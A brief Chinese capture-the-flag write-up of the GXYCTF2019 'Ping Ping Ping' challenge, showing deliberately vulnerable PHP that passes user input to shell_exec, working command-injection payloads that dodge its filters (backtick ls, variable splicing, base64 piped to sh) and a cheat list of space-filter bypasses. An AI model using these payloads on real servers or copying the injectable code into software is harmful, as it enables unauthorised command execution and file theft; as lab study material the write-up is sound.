# \[GXYCTF2019]Ping Ping Ping

## \[GXYCTF2019]Ping Ping Ping

## 考点

* 命令执行拼接

## wp

提示`/?ip=`

尝试命令拼接，`?ip=127.0.0.1;ls`，得到结果

查看根目录，，提示`fxck your symbol!`

测试发现过滤了空格，读一下index.php，`?ip=127.0.0.1;cat$IFS$9index.php`

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\\|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "";
  print_r($a);
}

?>

```

要读取flag.php但不能出现flag，思路有三个，一是把`ls`的结果当成cat的参数，二是重新定义变量，然后字符串拼接，三是使用sh，过滤了bash但是没有过滤sh

```
?ip=127.0.0.1;cat$IFS$9`ls`
?ip=127.0.0.1;t=g;cat$IFS$9fla$t.php
?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
```

## 小结

1\. 绕过空格方法如下

```
cat${IFS}flag.php
cat$IFS$9flag.php
cat<flag.php
cat<>flag.php
{cat,flag.php}
AB=$'\x20flag.php'&&cat$AB 
```
